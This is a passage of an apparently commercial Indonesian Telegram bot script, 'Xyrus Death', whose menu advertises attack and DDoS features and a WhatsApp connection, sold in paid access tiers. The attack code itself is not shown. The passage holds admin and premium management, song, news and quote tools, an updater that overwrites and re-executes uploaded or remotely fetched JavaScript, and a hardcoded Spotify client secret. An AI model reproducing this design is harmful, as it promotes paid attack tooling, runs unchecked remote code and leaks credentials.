<blockquote>Xyrus Death — RAMZXHYNEWERA [ 🍁 ]</blockquote>
—òlla ${username}, My name is @RAMZXHYNEWERA. I am the creator of this script. Please always support me so that this script runs smoothly. Thank you.

<blockquote><pre>⬡═―—⊱ ⎧ 『𝐗𝐘𝐑𝐔𝐒 𝐃𝐄𝐀𝐓𝐇』⊰―—═⬡</pre></blockquote>
<b>✧. Bot Name : 『𝐗𝐘𝐑𝐔𝐒 𝐃𝐄𝐀𝐓𝐇』</b>
<b>✧. Author : @RAMZXHYNEWERA</b>
<b>✧. Version : 6.0.0</b>
<b>✧. Runtime : ${runtime}</b>

<blockquote><pre>⬡═―—⊱ ⎧ STATUS USER ⎭ ⊰―—═⬡</pre></blockquote>
✧ User ID   : <b>${senderId}</b>
✧ Username  : <b>${username}</b>
✧ Status : <b>${premiumStatus}</b>

<blockquote><pre>⬡═―—⊱ ⎧ SELECT THE BUTTON MENU ⎭ ⊰―—═⬡</pre></blockquote>
`;
      replyMarkup = {
     inline_keyboard: [
     [
      { text: "「⚔️」Xyrus Attack", callback_data: "trashmenu" },
      { text: "「🛠」Tools Menu", callback_data: "toolsmenu" },
      { text: "「💣」Ddos Menu", callback_data: "Ddosmenu" }
    ],
    [ 
      { text: "「🧩」Group Menu", callback_data: "groupmenu" },
      { text: "「👑」Acces Menu", callback_data: "accesmenu" }
    ],
    [      
      { text: "「🍃」Thanks For", callback_data: "thanksto" }, 
    ], 
    [
      { text: "The 𝐊𝐢𝐧𝐤", url: "https://t.me/RAMZXHYNEWERA" }, 
       { text: "Informarion 𝐗𝐲𝐫𝐮𝐬", url: "https://t.me/Ramzxhych" }
    ]
  ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "video",
        media: vidthumbnail,
        caption: caption,
        parse_mode: "HTML"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});

// ~ Fun And Tools Menu


// ~ Connect
bot.onText(/\/connect (.+)/, async (msg, match) => {
const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Acces Admin</blockquote>
Please Buy Acces Admin To The Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "¡s ✧ Author", url: "https://t.me/Raffnotdev" }]
        ]
      }
    });
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Missing input. Please provide the number. Example: /Connect 62xxxx.");
  }
  
  const botNumber = match[1].replace(/[^0-9]/g, "");

  if (!botNumber || botNumber.length < 10) {
    return bot.sendMessage(chatId, "❌ Nomor yang diberikan tidak valid. Pastikan nomor yang dimasukkan benar.");
  }

  try {
    await ConnectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in Connect:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

// Acces !!
bot.onText(/\/setcd (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


/// --- ( case add acces premium ) --- \\\
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id; 
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, `
( ⚠️ ) *Akses Ditolak!*
Anda tidak memiliki izin untuk menjalankan perintah ini.`, { parse_mode: "Markdown" });
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, `
( ❌ ) *Perintah Salah!*
Gunakan format berikut:
✅ /addprem <code>6843967527 30d</code>
`, { parse_mode: "HTML" });
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
    return bot.sendMessage(chatId, `
( ❌ ) *Perintah Salah!*
Gunakan format:
✅ /addprem <code>6843967527 30d</code>
`, { parse_mode: "HTML" });
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1].toLowerCase();

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `
( ❌ ) *ID Tidak Valid!*
Gunakan hanya angka ID Telegram.
✅ Contoh: /addprem 6843967527 30d
`, { parse_mode: "Markdown" });
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(chatId, `
( ❌ ) *Durasi Tidak Valid!*
Gunakan format seperti: 30d, 12h, atau 15m.
✅ Contoh: /addprem 6843967527 30d
`, { parse_mode: "Markdown" });
  }

  const timeValue = parseInt(duration);
  const timeUnit = duration.endsWith("d") ? "days" :
                   duration.endsWith("h") ? "hours" : "minutes";
  const expirationDate = moment().add(timeValue, timeUnit);

  const existingUser = premiumUsers.find(u => u.id === userId);
  if (existingUser) {
    existingUser.expiresAt = expirationDate.toISOString();
    savePremiumUsers();
    bot.sendMessage(chatId, `
✅ *User sudah premium!*
Waktu diperpanjang sampai:
🕓 ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}
`, { parse_mode: "Markdown" });
  } else {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    bot.sendMessage(chatId, `
✅ *Berhasil menambahkan user premium!*
👤 ID: ${userId}
⏰ Berlaku hingga: ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}
`, { parse_mode: "Markdown" });
  }

  console.log(`[PREMIUM] ${senderId} menambahkan ${userId} sampai ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
});

/// --- ( case list acces premium ) --- \\\
bot.onText(/\/listprem/, (msg) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id; 
     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
  }

      if (premiumUsers.length === 0) {
      return bot.sendMessage(chatId, "📌 No premium users found.");
  }

      let message = "```";
      message += "\n";
      message += " ( + )  LIST PREMIUM USERS\n";
      message += "\n";
      premiumUsers.forEach((user, index) => {
      const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
      message += `${index + 1}. ID: ${user.id}\n   Exp: ${expiresAt}\n`;
      });
      message += "\n```";

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

// --- ( case add admin ) ---
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id; 
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      `❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired.
✅ Contoh: /addadmin 58273654 30d
`);
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired.
✅ Contoh: /addadmin 58273654 30d
`);
  }

  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveAdminUsers();
    console.log(`${senderId} Added ${userId} To Admin`);
    bot.sendMessage(chatId, `
✅ Berhasil menambahkan admin!
Kini user ${userId} memiliki akses admin.
`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} sudah menjadi admin.`);
  }
});


// --- ( case delete acces premium ) ---
bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id; 
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner/admin yang dapat melakukan command ini.`);
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, `
❌ Command salah!
✅ Contoh: /delprem 584726249`);
  }

  const userId = parseInt(match[1]);
  if (isNaN(userId)) {
    return bot.sendMessage(chatId, "❌ Invalid input. User ID harus berupa angka.");
  }

  const index = premiumUsers.findIndex(user => user.id === userId);
  if (index === -1) {
    return bot.sendMessage(chatId, `❌ User ${userId} tidak terdaftar di list premium.`);
  }

  premiumUsers.splice(index, 1);
  savePremiumUsers();
  bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar premium.`);
});


// --- ( case delete acces admin ) ---
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id; 
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      `❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(chatId, `
❌ Command salah!
✅ Contoh: /deladmin 5843967527`);
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `
❌ Command salah!
✅ Contoh: /deladmin 5843967527`);
  }

  const adminIndex = adminUsers.indexOf(userId);
  if (adminIndex !== -1) {
    adminUsers.splice(adminIndex, 1);
    saveAdminUsers();
    console.log(`${senderId} Removed ${userId} From Admin`);
    bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} belum memiliki akses admin.`);
  }
});


// --- ( Case Tools Menu ) --- \\
bot.onText(/^\/update$/, async (msg) => {
  const chatId = msg.chat.id
  const userId = msg.from.id

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Owner & Admin Acces</blockquote>
<b>Please Buy Acces To Author</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
        [{ text: "The 𝐊𝐢𝐧𝐤", url: "https://t.me/RAMZXHYNEWERA" }]
        ]
      }
    });
  }

  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(chatId, "❌ Balas ke file .js atau package.json yang ingin diupdate, lalu kirim /update")
  }

  const file = msg.reply_to_message.document
  const fileName = file.file_name

  if (!fileName.endsWith(".js") && fileName !== "package.json") {
    return bot.sendMessage(chatId, "❌ File harus berekstensi .js atau bernama package.json")
  }

  try {
    const fileLink = await bot.getFileLink(file.file_id)
    const filePath = path.join(__dirname, fileName)

    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath)
      bot.sendMessage(chatId, `🗑️ Old Files *${fileName}* Delete.`, { parse_mode: "Markdown" })
    }

    const fileStream = fs.createWriteStream(filePath)
    https.get(fileLink, (response) => {
      response.pipe(fileStream)
      fileStream.on("finish", () => {
        fileStream.close()
        bot.sendMessage(chatId, `✅ File *${fileName}* Updated !`, { parse_mode: "Markdown" })
        if (fileName === "XyrushDeath.js" || fileName === "package.json") {
          bot.sendMessage(chatId, `♻️ File penting diperbarui (${fileName}) — Bot akan restart...`, { parse_mode: "Markdown" })
          setTimeout(() => {
            exec("pm2 restart all || npm restart || node XyrushDeath.js", (err) => {
              if (err) console.error("Gagal restart bot:", err.message)
            })
          }, 2000)
        }
      })
    }).on("error", (err) => {
      bot.sendMessage(chatId, `❌ Gagal mengunduh file: ${err.message}`)
    })
  } catch (err) {
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${err.message}`)
  }
})

const GH_OWNER = "Ramzxhy";
const GH_REPO = "Update";
const GH_BRANCH = "main";

async function downloadRepo(dir = "", basePath = "/home/container") {
    const url = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${dir}?ref=${GH_BRANCH}`;

    const { data } = await axios.get(url, {
        headers: { "User-Agent": "Mozilla/5.0" }
    });

    for (const item of data) {
        const local = path.join(basePath, item.path);

        if (item.type === "file") {
            const fileData = await axios.get(item.download_url, { responseType: "arraybuffer" });
            fs.mkdirSync(path.dirname(local), { recursive: true });
            fs.writeFileSync(local, Buffer.from(fileData.data));
            console.log("[UPDATE]", local);
        }

        if (item.type === "dir") {
            fs.mkdirSync(local, { recursive: true });
            await downloadRepo(item.path, basePath);
        }
    }
}

bot.onText(/\/pullupdate/, async (msg) => {
    const chatId = msg.chat.id;

    bot.sendMessage(chatId, "🔄 Proses Auto Update...");

    try {
        await downloadRepo("https://github.com/Ramzxhy/Update.git", "/home/container");
        bot.sendMessage(chatId, "✅ Update selesai!\n🔁 Bot akan restart otomatis...");
        setTimeout(() => process.exit(0), 1500);
    } catch (e) {
        bot.sendMessage(chatId, "❌ Gagal update, cek repo GitHub atau koneksi.");
        console.log(e);
    }
});

bot.onText(/\/play (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const sender = msg.from.username || msg.from.first_name;
  const query = match[1]; 
  try {
    await bot.sendMessage(chatId, "⏳ Lagi nyari lagu di Spotify, tunggu bentar bre...");

    const api = `https://api.nekolabs.my.id/downloader/spotify/play/v1?q=${encodeURIComponent(query)}`;
    const { data } = await axios.get(api);

    if (!data.success || !data.result) {
      return bot.sendMessage(chatId, "❌ Gagal ambil data lagu dari Spotify!");
    }

    const { metadata, downloadUrl } = data.result;
    const { title, artist, cover, duration } = metadata;

    const caption = `
<blockquote>🎵 ${title || "Unknown"}</blockquote>
<blockquote>👤 ${artist || "Unknown"}</blockquote>
<blockquote>🕒 Durasi: ${duration || "-"}</blockquote>
`;

    await bot.sendVideo(chatId, cover, {
      caption,
      parse_mode: "HTML",
    });

    await bot.sendAudio(chatId, downloadUrl, {
      title: title || "Unknown Title",
      performer: artist || "Unknown Artist",
    });
  } catch (err) {
    console.error("Play Error:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memutar lagu bre.");
  }
});

bot.onText(/^\/listharga$/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(chatId, `
<blockquote>💰 <b>DAFTAR HARGA SCRIPT BOT</b></blockquote>
Klik tombol di bawah untuk melihat harga lengkap script bot:
  `, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📄 Lihat Harga Script", callback_data: "lihat_harga" }]
      ]
    }
  });
});

// Handler tombol
bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (data === "lihat_harga") {
    bot.sendMessage(chatId, `
<blockquote>💬 <b>SCRIPT WHATSAPP BOT</b></blockquote>
<blockquote>LIST HARGA SCRIPT XYRUS DEATH</blockquote>
- 10K NO UPDATE
- 15K FREE UP 3X
- 20K FULL UP
- 30K RESS
- 40K PARTNER
- 50K MODERATOR
- 60K OWNER 
- 70 CREATOR

contact: @RAMZXHYNEWERA</blockquote>
    `, { parse_mode: "HTML" });
  }

  bot.answerCallbackQuery(callbackQuery.id);
});


const SPOTIFY_CLIENT_ID = "e791953ecb0540d898a5d2513c9a0dd2";
const SPOTIFY_CLIENT_SECRET = "23e971c5b0ba4298985e8b00ce71d238";

// Fungsi ambil token Spotify
async function getSpotifyToken() {
  const res = await fetch("https://accounts.spotify.com/api/token", {
    method: "POST",
    headers: {
      "Authorization":
        "Basic " +
        Buffer.from(`${SPOTIFY_CLIENT_ID}:${SPOTIFY_CLIENT_SECRET}`).toString("base64"),
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: "grant_type=client_credentials",
  });
  const data = await res.json();
  return data.access_token;
}

// Fungsi cari lagu di Spotify
async function searchSpotify(query) {
  const token = await getSpotifyToken();
  const res = await fetch(
    `https://api.spotify.com/v1/search?q=${encodeURIComponent(query)}&type=track&limit=1`,
    { headers: { Authorization: `Bearer ${token}` } }
  );
  const data = await res.json();
  if (data.tracks?.items?.length === 0) return null;
  return data.tracks.items[0];
}

// Command /song
bot.onText(/^\/song(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1]?.trim(); 
  if (!query) {
    return bot.sendMessage(
      chatId,
      "🎵 Gunakan format:\n`/song [judul lagu]`\nContoh: `/song shape of you`",
      { parse_mode: "Markdown" }
    );
  }

  await bot.sendMessage(chatId, `🔍 Mencari *${query}* di Spotify...`, {
    parse_mode: "Markdown",
  });

  try {
    const song = await searchSpotify(query);
    if (!song) {
      return bot.sendMessage(chatId, "❌ Lagu tidak ditemukan di Spotify.");
    }

    const title = song.name;
    const artist = song.artists.map(a => a.name).join(", ");
    const album = song.album.name;
    const url = song.external_urls.spotify;
    const cover = song.album.images[0]?.url;

    const keyboard = {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🎧 Dengar di Spotify", url: url }]
        ]
      }
    };

    await bot.sendPhoto(chatId, cover, {
      caption: `🎵 *${title}*\n👤 ${artist}\n💽 Album: ${album}`,
      parse_mode: "Markdown",
      ...keyboard
    });
  } catch (err) {
    console.error("Error /song:", err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat mencari lagu.");
  }
});

bot.onText(/^\/shortlink(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1]; 
  if (!url) {
    return bot.sendMessage(
      chatId,
      "🔗 Kirim link yang ingin dipendekkan!\n\nContoh:\n`/shortlink https://example.com/artikel/panjang/banget`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    // Gunakan TinyURL API (tidak butuh API key)
    const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`);
    const shortUrl = await res.text();

    if (!shortUrl || !shortUrl.startsWith("http")) {
      throw new Error("Gagal memendekkan link");
    }

    await bot.sendMessage(
      chatId,
      `✅ *Link berhasil dipendekkan!*\n\n🔹 Asli: ${url}\n🔹 Pendek: ${shortUrl}`,
      { parse_mode: "Markdown" }
    );
  } catch (err) {
    console.error("❌ Error shortlink:", err);
    bot.sendMessage(chatId, "⚠️ Gagal memendekkan link. Coba lagi nanti.");
  }
});

bot.onText(/^\/fileinfo$/, (msg) => {
  bot.sendMessage(msg.chat.id, "📂 Kirim file yang mau kamu cek infonya!");
});

// Saat user kirim file, foto, audio, atau dokumen
bot.on("document", async (msg) => handleFile(msg, "document"));
bot.on("photo", async (msg) => handleFile(msg, "photo"));
bot.on("video", async (msg) => handleFile(msg, "video"));
bot.on("audio", async (msg) => handleFile(msg, "audio"));

async function handleFile(msg, type) {
  const chatId = msg.chat.id;
  let fileId, fileName;

  if (type === "document") {
    fileId = msg.document.file_id;
    fileName = msg.document.file_name;
  } else if (type === "photo") {
    const photo = msg.photo.pop();
    fileId = photo.file_id;
    fileName = `photo_${chatId}.jpg`;
  } else if (type === "video") {
    fileId = msg.video.file_id;
    fileName = msg.video.file_name || `video_${chatId}.mp4`;
  } else if (type === "audio") {
    fileId = msg.audio.file_id;
    fileName = msg.audio.file_name || `audio_${chatId}.mp3`;
  }

  try {
    const file = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
    const fileExt = path.extname(file.file_path);
    const fileSize = formatBytes(file.file_size);

    const info = `
📁 *Informasi File*
━━━━━━━━━━━━━━━━
📄 Nama: ${fileName}
📏 Ukuran: ${fileSize}
🧩 Ekstensi: ${fileExt || "-"}
🔗 URL: [Klik di sini](${fileUrl})
`;

    bot.sendMessage(chatId, info, { parse_mode: "Markdown", disable_web_page_preview: false });
  } catch (err) {
    console.error("❌ Gagal ambil info file:", err);
    bot.sendMessage(chatId, "⚠️ Gagal mendapatkan info file. Coba kirim ulang filenya.");
  }
}

// Fungsi bantu untuk format ukuran file
function formatBytes(bytes, decimals = 2) {
  if (!+bytes) return "0 B";
  const k = 1024;
  const dm = decimals < 0 ? 0 : decimals;
  const sizes = ["B", "KB", "MB", "GB", "TB"];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`;
}

bot.onText(/^\/negarainfo(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const negara = match[1]?.trim(); 
  if (!negara) {
    return bot.sendMessage(chatId, "🌍 Ketik nama negara!\nContoh: `/negarainfo jepang`", { parse_mode: "Markdown" });
  }

  try {
    const res = await fetch(`https://restcountries.com/v3.1/name/${encodeURIComponent(negara)}?fullText=false`);
    const data = await res.json();

    if (!Array.isArray(data) || !data.length) {
      return bot.sendMessage(chatId, "⚠️ Negara tidak ditemukan. Coba ketik nama lain.");
    }

    const n = data[0];
    const name = n.translations?.id?.common || n.name.common;
    const capital = n.capital ? n.capital[0] : "Tidak ada data";
    const region = n.region || "Tidak ada data";
    const subregion = n.subregion || "-";
    const population = n.population?.toLocaleString("id-ID") || "-";
    const currency = n.currencies ? Object.values(n.currencies)[0].name : "-";
    const symbol = n.currencies ? Object.values(n.currencies)[0].symbol : "";
    const flag = n.flag || "🏳️";

    const info = `
${flag} *${name}*

🏙️ Ibukota: ${capital}
🌍 Wilayah: ${region} (${subregion})
👨‍👩‍👧‍👦 Populasi: ${population}
💰 Mata uang: ${currency} ${symbol}
📍 Kode negara: ${n.cca2 || "-"}
`;

    bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Error negara info:", err);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data negara. Coba lagi nanti.");
  }
});

bot.onText(/^\/beritaindo$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "📰 Sedang mengambil berita terbaru Indonesia...");

  try {
    // RSS Google News Indonesia
    const url = "https://news.google.com/rss?hl=id&gl=ID&ceid=ID:id";
    const res = await fetch(url);
    const xml = await res.text();

    // Ambil judul dan link berita (pakai regex biar ringan)
    const titles = [...xml.matchAll(/<title>(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?<\/title>/g)].map((m) => m[1]);
    const links = [...xml.matchAll(/<link>(.*?)<\/link>/g)].map((m) => m[1]);

    // Lewati item pertama (judul feed)
    const items = titles.slice(1, 6).map((t, i) => ({
      title: t,
      link: links[i + 1] || "",
    }));

    // Format teks berita
    const beritaText = items
      .map((item, i) => `${i + 1}. [${item.title}](${item.link})`)
      .join("\n\n");

    await bot.sendMessage(
      chatId,
      `🇮🇩 *Berita Indonesia Terbaru*\n\n${beritaText}\n\nSumber: ©GerZx`,
      { parse_mode: "Markdown", disable_web_page_preview: true }
    );
  } catch (error) {
    console.error("❌ Error beritaindo:", error);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil berita. Coba lagi nanti.");
  }
});

bot.onText(/^\/logo (.+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1]; 
  try {
    // Gunakan layanan FlamingText (gratis, no API key)
    const logoUrl = `https://flamingtext.com/net-fu/proxy_form.cgi?imageoutput=true&script=neon-logo&text=${encodeURIComponent(text)}`;

    await bot.sendMessage(chatId, `🖋️ Logo kamu siap!\nTeks: *${text}*`, { parse_mode: "Markdown" });
    await bot.sendPhoto(chatId, logoUrl, { caption: "✨ Logo by FlamingText" });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat membuat logo. Coba lagi nanti.");
  }
});

bot.onText(/^\/pantun(?:\s+(\w+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const kategori = (match[1] || "acak").toLowerCase(); 
  const pantun = {
    lucu: [
      "Pergi ke hutan mencari rusa,\nEh malah ketemu si panda.\nLihat kamu senyum manja,\nBikin hati jadi gembira 😆",
      "Pagi-pagi makan soto,\nSambil nonton film kartun.\nLihat muka kamu begitu,\nAuto hilang semua beban 😄",
      "Burung pipit terbang ke awan,\nTurun lagi ke pinggir taman.\nLihat kamu ketawa lebay-an,\nTapi lucunya kebangetan! 😂"
    ],
    cinta: [
      "Pergi ke pasar membeli bunga,\nBunga mawar warna merah.\nCinta ini untukmu saja,\nSelamanya takkan berubah ❤️",
      "Mentari pagi bersinar indah,\nBurung berkicau sambut dunia.\nCintaku ini sungguh berserah,\nHanya padamu selamanya 💌",
      "Bintang di langit berkelip terang,\nAngin malam berbisik lembut.\nHatiku tenang terasa senang,\nSaat kau hadir beri hangat 💞"
    ],
    bijak: [
      "Padi menunduk tanda berisi,\nRumput liar tumbuh menjulang.\nOrang bijak rendah hati,\nWalau ilmu setinggi bintang 🌾",
      "Air jernih di dalam kendi,\nJatuh setetes ke atas batu.\nJangan sombong dalam diri,\nHidup tenang karena bersyukur selalu 🙏",
      "Ke pasar beli pepaya,\nDibelah dua buat sarapan.\nBijaklah dalam setiap kata,\nAgar hidup penuh kedamaian 🌿"
    ]
  };

  // Gabungkan semua kategori buat opsi "acak"
  const allPantun = [...pantun.lucu, ...pantun.cinta, ...pantun.bijak];

  // Pilih pantun sesuai kategori
  let daftar;
  if (pantun[kategori]) daftar = pantun[kategori];
  else daftar = allPantun;

  const randomPantun = daftar[Math.floor(Math.random() * daftar.length)];

  bot.sendMessage(
    chatId,
    `🎭 *Pantun ${kategori.charAt(0).toUpperCase() + kategori.slice(1)}:*\n\n${randomPantun}`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/^\/trending$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "📊 Sedang mengambil topik trending di Indonesia..."); 
  try {
    // URL Google Trends RSS Indonesia
    const trendsUrl = "https://trends.google.com/trends/trendingsearches/daily/rss?geo=ID";
    const newsUrl = "https://news.google.com/rss?hl=id&gl=ID&ceid=ID:id"; // fallback

    // Ambil data dari Google Trends dulu
    const res = await fetch(trendsUrl);
    const xml = await res.text();

    // Regex ambil judul
    let titles = [...xml.matchAll(/<title>(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?<\/title>/g)]
      .map(match => match[1])
      .slice(1, 10); // lewati judul pertama (feed title)

    // Jika tidak ada hasil, fallback ke Google News
    if (!titles.length) {
      console.log("⚠️ Google Trends kosong, fallback ke Google News...");
      const newsRes = await fetch(newsUrl);
      const newsXml = await newsRes.text();

      const newsMatches = [...newsXml.matchAll(/<title>(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?<\/title>/g)];
      const linkMatches = [...newsXml.matchAll(/<link>(.*?)<\/link>/g)];

      // Gabungkan judul + link (lewati entry pertama = header feed)
      const items = newsMatches.slice(1, 11).map((m, i) => ({
        title: m[1],
        link: linkMatches[i + 1] ? linkMatches[i + 1][1] : "",
      }));

      if (items.length) {
        const list = items.map((x, i) => `${i + 1}. [${x.title}](${x.link})`).join("\n\n");
        return bot.sendMessage(
          chatId,
          `📰 *Berita Teratas Hari Ini (Fallback: Google News)*\n\n${list}\n\nSumber: ©GerZx`,
          { parse_mode: "Markdown", disable_web_page_preview: true }
        );
      } else {
        return bot.sendMessage(chatId, "⚠️ Tidak ada data trending atau berita tersedia saat ini.");
      }
    }

    // Jika ada hasil dari Google Trends
    const list = titles.map((t, i) => `${i + 1}. ${t}`).join("\n");
    await bot.sendMessage(
      chatId,
      `📈 *Topik Trending Hari Ini (Google Trends Indonesia)*\n\n${list}\n\nSumber: ©GerZx Trends`,
      { parse_mode: "Markdown" }
    );

  } catch (error) {
    console.error("❌ Error trending:", error);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data trending. Coba lagi nanti.");
  }
});

bot.onText(/^\/katahariini$/, (msg) => {
  const chatId = msg.chat.id; 
  // Kumpulan kata bijak atau kata mutiara
  const kataBijak = [
    "🌻 Hidup bukan tentang menunggu badai reda, tapi belajar menari di tengah hujan.",
    "🌅 Jangan biarkan kemarin mengambil terlalu banyak dari hari ini.",
    "💡 Satu-satunya batasan dalam hidupmu adalah dirimu sendiri.",
    "🔥 Setiap langkah kecil membawa kamu lebih dekat ke impianmu.",
    "🌈 Jika kamu tidak bisa terbang, berlarilah. Jika tidak bisa berlari, berjalanlah. Tapi teruslah bergerak maju.",
    "🌙 Jangan bandingkan perjalananmu dengan orang lain. Fokus pada jalanmu sendiri.",
    "☀️ Setiap hari adalah kesempatan baru untuk menjadi lebih baik dari kemarin.",
    "🌸 Kegagalan bukan akhir, tapi bagian dari proses menuju sukses.",
    "💫 Lakukan yang terbaik hari ini, karena besok belum tentu datang.",
    "🦋 Jangan takut berubah, karena perubahan adalah tanda kamu bertumbuh."

  ];

  // Pilih acak satu kata bijak
  const randomKata = kataBijak[Math.floor(Math.random() * kataBijak.length)];

  // Kirim pesan
  bot.sendMessage(chatId, `📜 *Kata Hari Ini:*\n\n${randomKata}`, { parse_mode: "Markdown" });
});

bot.onText(/^\/motivasi$/, async (msg) => {
  const chatId = msg.chat.id; 
  // Kumpulan kata motivasi
  const motivasi = [
    "🔥 Jangan pernah menyerah, karena hal besar butuh waktu.",
    "💪 Kesuksesan tidak datang dari apa yang kamu lakukan sesekali, tapi dari apa yang kamu lakukan setiap hari.",
    "🌟 Percayalah pada proses, bukan hanya hasil.",
    "🚀 Gagal itu biasa, yang penting kamu tidak berhenti mencoba.",
    "💡 Mimpi besar dimulai dari langkah kecil yang berani.",
    "🌈 Setiap hari adalah kesempatan baru untuk menjadi lebih baik.",
    "🦁 Jangan takut gagal — takutlah kalau kamu tidak mencoba.",
    "🌻 Fokuslah pada tujuanmu, bukan pada hambatan di sekitarmu.",
    "⚡ Orang sukses bukan yang tidak pernah gagal, tapi yang tidak pernah menyerah.",
    "🌤️ Kamu lebih kuat dari yang kamu kira. Terus melangkah!"

  ];

  // Pilih kata motivasi acak
  const randomMotivasi = motivasi[Math.floor(Math.random() * motivasi.length)];
  await bot.sendMessage(chatId, `✨ *Motivasi Hari Ini:*\n\n${randomMotivasi}`, {
    parse_mode: "Markdown",
  });
});

bot.onText(/^\/hariini$/, (msg) => {
  const chatId = msg.chat.id; 
  // Ambil tanggal dan waktu saat ini (WIB)
  const now = new Date();
  const optionsTanggal = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };

  // Format ke bahasa Indonesia
  const tanggal = now.toLocaleDateString('id-ID', optionsTanggal);
